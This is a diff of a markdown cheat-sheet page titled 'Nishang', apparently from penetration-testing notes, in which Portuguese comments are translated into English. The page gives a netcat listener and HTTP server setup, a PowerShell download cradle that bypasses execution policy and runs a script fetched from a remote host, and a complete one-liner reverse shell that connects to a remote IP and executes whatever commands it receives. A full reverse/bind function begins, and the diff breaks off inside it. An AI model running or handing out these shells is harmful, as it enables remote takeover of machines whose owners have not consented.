@@ -4,26 +4,26 @@ title: "Nishang"
 
 # Nishang
 
-Função PowerShell TCP completa baseada no Nishang com suporte a modos reverse e bind. Inclui o one-liner de execução remota via download cradle.
+Full PowerShell TCP function based on Nishang, supporting both reverse and bind modes. Includes the remote execution one-liner via download cradle.
 
 ```shell
-# Iniciar servidor HTTP e listener
+# Start HTTP server and listener
 python3 -m http.server 80
 nc -vnlp 443
 
-# Salvar o payload e executar remotamente
+# Save payload and execute remotely
 nano nishangol.ps1
-# (colar o conteúdo abaixo)
+# (paste content below)
 powershell.exe -ep bypass "iex(new-object net.webclient).downloadstring('http://192.168.45.159/nishangol.ps1')"
 ```
 
 ```powershell
-# One-liner (salvar como nishangol.ps1)
+# One-liner (save as nishangol.ps1)
 $client = New-Object System.Net.Sockets.TCPClient("192.168.45.152",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
 
 ```powershell
-# Função completa (reverse + bind)
+# Full function (reverse + bind)
 function cehb
 {
     [CmdletBinding(DefaultParameterSetName="reverse")] Param(
